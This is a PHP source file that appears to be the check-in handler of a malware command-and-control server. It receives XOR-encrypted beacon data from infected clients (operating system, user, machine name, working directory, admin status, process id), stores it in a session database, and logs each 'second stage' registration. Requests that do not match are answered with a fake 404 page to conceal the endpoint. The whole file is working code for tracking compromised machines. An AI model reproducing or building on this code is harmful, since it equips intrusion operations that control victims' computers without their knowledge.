<?php
include 'conn.php';
include 'chcksid.php';
include 'functions/updateLogs.function.php';
include 'functions/updateSessionDetails.function.php';
include 'functions/retrieveKey.function.php';
include 'ipAndUserAgent.php';

// Get initial informations from client
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["opsys"]) && isset($_POST["sus"]) && isset($_POST["mName"]) && isset($_POST["wdir"]) && isset($_POST["isadm"]))
{
    $xorkey = retrieveXorKey($conn, $str);
    $opsys = decrypt($_POST["opsys"], $xorkey);
    $sus = decrypt($_POST["sus"], $xorkey);
    $mName = decrypt($_POST["mName"], $xorkey);
    $wdir = decrypt($_POST["wdir"], $xorkey);
    $isAdmin = decrypt($_POST["isadm"], $xorkey);
    $pcid = decrypt($_POST["pid"], $xorkey);
    $pid = (int)$pcid;

    //decrypt messages with key and push new infos to database
    if (strlen($sus) > 3 && strlen($mName) > 3 && strlen($wdir) > 3 && strlen($opsys) > 3)
    {
        $updatedDetails = updateSessionDetails($conn, $pid, $opsys, $sus, $mName, $wdir, $isAdmin, $str, $ip);
        if (strpos($updatedDetails, 'error'))
        {
            updateLogs($conn, "Error", "Error; update details", $agent, $str, $ip);
        }
        elseif ($updatedDetails == "completed")
        {
            updateLogs($conn, "Second stage", "Registration OK", $agent, $str, $ip);
        }
    }

}
else
{
    //Use header function to send a 404
    header($_SERVER["SERVER_PROTOCOL"] . " 404 Not Found", true, 404);
    echo "<html><title>Not Found</title><h1>PAGE NOT FOUND</h1><html>";
    //End the script
    exit;
}
?>
